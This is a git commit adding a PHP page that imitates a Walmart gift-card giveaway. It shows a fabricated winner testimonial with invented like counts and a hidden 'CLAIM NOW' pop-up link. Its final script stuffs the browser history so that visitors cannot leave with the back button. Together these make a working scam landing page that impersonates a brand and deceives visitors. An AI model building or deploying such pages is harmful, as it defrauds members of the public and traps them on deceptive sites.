9db4546a8080a41d90fa1a79c41f25c54fc15bc7
uso <56787010+usoppu@users.noreply.github.com>
2020-05-14 01:06:29 +0000

    init

---
+++ thankyou.php
@@ -0,0 +1,122 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" webdriver="true">
+
+<head>
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Walmart Gift Cards</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link href="css/ios2.css" rel="stylesheet" type="text/css">
+
+    <script src="js/jquery.min.js"></script>
+    <style>
+        .button {
+            background-color: #fa6400!important;
+        }
+    </style>
+    <style id="style-1-cropbar-clipper">
+        .en-markup-crop-options {
+            top: 18px!important;
+            left: 50%!important;
+            margin-left: -100px!important;
+            width: 200px!important;
+            border: 2px rgba(255, 255, 255, .38) solid!important;
+            border-radius: 4px!important;
+        }
+        .en-markup-crop-options div div:first-of-type {
+            margin-left: 0px!important;
+        }
+    </style>
+</head>
+
+<body data-gr-c-s-loaded="true" style="background-color:#0074b8!important;">
+	<div style="padding-top:10px; padding-left:10px; padding-right:10px; display:inline-block; width:100%">
+        <div style="width:100%; text-align:center; "> <img src="images/wlmlogo.png" style="height:30px;"> </div>
+    </div>
+    <style>
+        .prize-box {
+            box-shadow: 0 0 2px 2px #e9e9e9;
+            padding: 10px 6px;
+            position: relative;
+        }
+        .leftcol {
+            width: 40%;
+            padding-right: 10px;
+        }
+        .leftcol img {
+            width: 100%;
+        }
+        .rightcol {
+            width: 60%;
+            height: 200px;
+            vertical-align: top;
+        }
+        .prize-head {
+            font-size: 16px;
+            font-weight: bold;
+            color: black!important;
+        }
+        .button-prize {
+            background-color: #fa6400;
+            color: #fff;
+            font-size: 12px;
+            padding: 10px;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+        }
+        .space-row {
+            height: 10px;
+        }
+    </style>
+    <div class="content">
+        <div class="main-content">
+            <div class="comments" id="comment6" style="display: block;">
+                <div class="profile"><img src="images/tes-1.jpg">
+                </div>
+                <div class="comment-content">
+                    <p class="name">Callum Davy</p>
+                    <p>WON! Thank you Walmart! Thank you Walmart!!!
+                        <br>
+                    </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status"><span>Like · Comment ·<img src="images/like.png" height="15px" width="15px">34</span>· Just now</div>
+            </div>
+            <hr align="center" color="black" size="2px" width="100%">
+            <br> <span rel="noreferrer" style="display:none;" onclick="PreventExitPop = false;launchpopLink(event);" class="claim" id="btnclaim2">
+				<div class="button2" style="background-color: #fa6400!important;">CLAIM NOW</div>
+			</span> </div>
+    </div>
+    <script>
+        function total_likes() {
+            if (document.getElementById('total_likes').innerHTML == 'You and <span style="color:#3b5998;">11,328</span> like this') {
+                document.getElementById('total_likes').innerHTML = '<span style="color:#3b5998;">11,328</span> likes this';
+                document.getElementById('liked').innerHTML = 'Like';
+            } else {
+                document.getElementById('total_likes').innerHTML = 'You and <span style="color:#3b5998;">11,328</span> likes this';
+                document.getElementById('liked').innerHTML = 'Unlike';
+            }
+        }
+
+        function showStep2() {}
+    </script>
+    <script type="text/javascript">
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", window.location.href.split(window.location.hash || "#")[0] + "#");
+                window.addEventListener('popstate', function() {
+                    t.state && location.replace(window.location.href.split(window.location.hash || "#")[0] + "#")
+                });
+            } catch (o) {}
+        }();
+    </script>
+</body>
+
+</html>
